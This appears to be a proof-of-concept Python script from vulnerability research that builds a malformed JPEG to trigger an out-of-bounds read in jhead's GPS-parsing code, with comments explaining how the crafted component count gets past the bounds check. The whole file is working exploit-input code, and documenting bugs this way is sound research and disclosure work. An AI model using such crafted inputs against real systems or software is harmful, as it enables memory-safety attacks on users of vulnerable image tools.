#!/usr/bin/env python3
"""
PoC Generator for VULN-001: GPS Lat/Long Out-of-Bounds Read via Under-counted Components
Target: jhead ProcessGpsInfo() in gpsinfo.c
CWE: CWE-125 (Out-of-bounds Read)

The bug:
  - ProcessGpsInfo validates OffsetVal + Components*ComponentSize <= ExifLength
  - Then hardcodes a loop of 3 iterations regardless of Components
  - With Components=1 and Format=URATIONAL (8 bytes/component), only 8 bytes
    are validated but the loop reads 3*8=24 bytes total (16 bytes OOB)

EXIF/TIFF structure (little-endian):
  ExifSection = TIFF data passed to process_EXIF()
  ExifLength  = itemlen - 8  (where itemlen = APP1 section size including 2-byte length field)

  All offsets below are relative to ExifSection start (= OffsetBase in jhead code).
"""

import struct
import sys
import os

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001_input.jpg")

def le16(v):
    return struct.pack("<H", v)

def le32(v):
    return struct.pack("<I", v)


# ── TIFF data layout ──────────────────────────────────────────────────────────
# Offset   Size  Content
#  0- 3     4    TIFF header: II 2A 00 (little-endian magic)
#  4- 7     4    IFD0 offset from TIFF start = 8
#  8- 9     2    IFD0 NumEntries = 1
# 10-21    12    IFD0 entry: TAG_GPSINFO (0x8825, LONG, count=1, value=GPS_IFD_OFF)
# 22-25     4    IFD0 next IFD = 0
# 26-27     2    GPS IFD NumEntries = 1
# 28-39    12    GPS IFD entry: TAG_GPS_LAT (0x0002, URATIONAL, count=1[BUG], offset=LAT_OFF)
# 40-47     8    GPS lat rational data (1 component = numerator + denominator)
#                Loop will try to read 3 components (24 bytes): offsets 0,8,16 from here
#                OOB reads at offsets 8-23 (past the single declared component)
# ─────────────────────────────────────────────────────────────────────────────

GPS_IFD_OFF = 26   # offset of GPS IFD within TIFF/ExifSection
LAT_DATA_OFF = 40  # offset of GPS lat rational data within TIFF/ExifSection

# BUG: Components declared as 1 (should be 3 for a valid GPS latitude)
# Boundary check: OffsetVal(40) + ByteCount(1*8=8) = 48 == ExifLength → passes
# Loop:  for (a=0; a<3; a++) reads ValuePtr+a*8 through ValuePtr+a*8+7
#   a=0: [40..47] — valid
#   a=1: [48..55] — OOB (past ExifLength=48)
#   a=2: [56..63] — OOB (past ExifLength=48)
BUG_COMPONENTS = 1  # should be 3

TAG_GPSINFO = 0x8825
TAG_GPS_LAT = 0x0002
FMT_LONG     = 4
FMT_URATIONAL = 5

tiff = bytearray()

# TIFF header (8 bytes)
tiff += b'II'          # little-endian marker
tiff += le16(0x002A)   # TIFF magic
tiff += le32(8)        # IFD0 offset = 8 (starts right after header)

# IFD0: 1 entry (bytes 8-25)
tiff += le16(1)                 # NumEntries = 1
# Entry: TAG_GPSINFO
tiff += le16(TAG_GPSINFO)       # tag 0x8825
tiff += le16(FMT_LONG)          # format LONG (4 bytes)
tiff += le32(1)                 # count = 1
tiff += le32(GPS_IFD_OFF)       # value = offset to GPS IFD (26)
# IFD0 next IFD chain pointer
tiff += le32(0)                 # no next IFD

# GPS IFD: 1 entry (bytes 26-39)
tiff += le16(1)                 # NumEntries = 1
# Entry: TAG_GPS_LAT
tiff += le16(TAG_GPS_LAT)       # tag 0x0002
tiff += le16(FMT_URATIONAL)     # format URATIONAL (8 bytes/component)
tiff += le32(BUG_COMPONENTS)    # *** Components = 1 (should be 3) — TRIGGER ***
tiff += le32(LAT_DATA_OFF)      # OffsetVal = 40 (points to GPS lat data)

# GPS lat rational data: 1 component = 8 bytes (bytes 40-47)
# Only 8 bytes of data, but the loop will read 24 bytes (3 components)
numerator   = 51          # degrees (e.g., 51° N)
denominator = 1
tiff += le32(numerator)
tiff += le32(denominator)

# Verify ExifLength
exif_length = len(tiff)
assert exif_length == 48, f"ExifLength should be 48, got {exif_length}"

# Verify the boundary check that jhead performs (must pass):
# OffsetVal + Components*ComponentSize <= ExifLength
byte_count = BUG_COMPONENTS * 8
assert LAT_DATA_OFF + byte_count <= exif_length, (
    f"Boundary check in jhead would reject: {LAT_DATA_OFF}+{byte_count}>{exif_length}"
)

# The loop will try to read at offsets 0, 8, 16 from LAT_DATA_OFF:
for a in range(3):
    start = LAT_DATA_OFF + a * 8
    end   = start + 7
    oob   = "OOB!" if start >= exif_length else ("OOB (partial)!" if end >= exif_length else "valid")
    print(f"  Component a={a}: reads ExifSection[{start}..{end}] — {oob}")

# ── Build APP1 section ────────────────────────────────────────────────────────
exif_sig  = b'Exif\x00\x00'
app1_body = exif_sig + bytes(tiff)  # 6 + 48 = 54 bytes
app1_len  = len(app1_body) + 2      # +2 for the length field itself
assert app1_len == 56, f"APP1 length should be 56, got {app1_len}"

# ── Assemble JPEG ─────────────────────────────────────────────────────────────
jpeg = bytearray()
jpeg += b'\xFF\xD8'                                # SOI
jpeg += b'\xFF\xE1'                                # APP1 marker
jpeg += struct.pack(">H", app1_len)                # APP1 length (big-endian)
jpeg += app1_body                                  # Exif\0\0 + TIFF data
jpeg += b'\xFF\xD9'                                # EOI

with open(OUTPUT_FILE, 'wb') as f:
    f.write(jpeg)

print(f"\nWrote {len(jpeg)} bytes to {OUTPUT_FILE}")
print(f"ExifLength = {exif_length} bytes")
print(f"OffsetVal  = {LAT_DATA_OFF} (LAT_DATA_OFF)")
print(f"ByteCount  = {byte_count} (1 component × 8 bytes — jhead boundary check uses this)")
print(f"Loop reads = 24 bytes (3 × 8 — hardcoded in gpsinfo.c line 141)")
print(f"OOB reads  = bytes [{exif_length}..{exif_length+15}] past ExifLength boundary")
print("NOTE: OOB reads land in the extra 20 bytes allocated by jpgfile.c (malloc+20),")
print("      so ASAN heap-overflow may not fire; logical OOB still occurs.")
